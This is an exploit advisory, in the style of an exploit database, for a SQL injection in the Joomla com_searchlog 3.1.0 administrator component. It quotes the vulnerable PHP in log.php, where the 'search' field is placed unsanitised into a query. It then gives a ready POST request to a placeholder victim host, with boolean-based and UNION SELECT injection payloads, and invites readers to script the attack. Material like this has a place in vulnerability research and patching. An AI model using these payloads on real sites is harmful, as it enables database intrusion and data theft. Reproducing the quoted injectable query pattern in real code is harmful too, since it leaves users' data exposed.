Joomla Component com_searchlog SQL Injection Vulnerability
==========================================================

#Exploit Title:     Joomla Component com_searchlog SQL Injection
 
#Date:          05/06/2010
 
#Author:        d0lc3   d0lc3x[at]gmail[dom]com
 
#Software Link:     http://www.kanich.net/radio/site/searchlog/searchlog-download
 
#Version:       3.1.0
 
#Tested on:     Linux ubuntu32 2.6.32-22-generic x64
 
#Summary:
     
 
    Good nights, at this occassion  we have other not-saned POST variable on
    administrator/components/com_searchlog/models/log.php, line 30:
...
$search = $mainframe->getUserStateFromRequest($option . &#039;.search&#039;, &#039;search&#039;, &#039;&#039;, &#039;string&#039;);  //wtf!?
$this->filter_actid = $mainframe->getUserStateFromRequest($option .&#039;actid&#039;,&#039;actid&#039;,0,&#039;int&#039;);
$data->search = JString::strtolower($search);    //wtf!?
$callbase = JRequest::getInt(&#039;callbase&#039;, 1);
$newact =JRequest::getString(&#039;newact&#039;);
$data->newact = "";
if ($task=="" and $newact!="") {
$data->newact = $newact;
}if ($task == &#039;upload&#039; or $task == &#039;savenew&#039;) {
$data->sort = &#039;dates&#039;;
$limitstart = 0;
}else {
$data->sort = JRequest::getVar(&#039;sort&#039;, &#039;calls&#039;);
}if ($data->search) {
$where[] = "(LOWER( m.call ) LIKE &#039;$data->search%&#039; OR LOWER( m.call ) LIKE &#039;%/$data->search%&#039;)"; //likely SQLi
...
 
    In order to exploit it, i advice programming script for it :P but if only you want try vuln, to change POST request on HTTP header:
 
http://VICTIM/administrator/index.php?option=com_searchlog&act=log
 
POST /administrator/index.php?option=com_searchlog&act=log HTTP/1.1
Host: VICTIM
Content-Type: application/x-www-form-urlencoded
Content-Length: xxx
search=[SQLi]
&sort=calls&limit=20&limitstart=0&option=com_searchlog&act=log&task=&callbase=1&boxchecked=1&hidemainmenu=0
 
    Where [SQLi] = someLogExisting&#039;) and 1=1# => true
               someLogExisting&#039;) and 1=2# => false
 
    UNION SQLi = someLogExisting&#039;) union select 1,2,3,4,5,6,7,8#



